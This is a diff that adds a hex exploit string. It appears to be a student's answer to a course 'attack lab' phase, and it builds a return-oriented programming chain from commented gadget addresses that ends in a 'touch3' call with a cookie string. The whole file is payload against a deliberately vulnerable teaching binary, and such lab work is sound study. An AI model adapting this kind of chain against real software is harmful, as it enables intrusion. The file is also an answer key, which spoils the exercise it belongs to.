@@ -1,0 +1,15 @@
+33 33 33 33 33 33 33 33
+33 33 33 33 33 33 33 33
+33 33 33 33 33 33 33 33
+70 18 40 00 00 00 00 00 /* setval_243 address; mov %rsp, %rax */
+1b 18 40 00 00 00 00 00 /* getval_387 address; mov %rax, %rdi */
+31 18 40 00 00 00 00 00 /* setval_382 address; popq %rax */
+50 00 00 00 00 00 00 00 /* shift */
+4e 18 40 00 00 00 00 00 /* addval_468 address; movl %eax, %ecx */
+54 18 40 00 00 00 00 00 /* getval_214 address; movl %ecx, %edx */
+85 18 40 00 00 00 00 00 /* addval_257 address; movl %edx, %esi */
+47 18 40 00 00 00 00 00 /* add_xy address; lea (%rsi,%rdi,1),%rax */
+1b 18 40 00 00 00 00 00 /* getval_387 address; movq %rax, %rdi */
+78 17 40 00 00 00 00 00 /* touch3 address */
+00 00 00 00 00 00 00 00 /* cookie end */
+37 35 34 65 37 64 64 64 /* cookie */
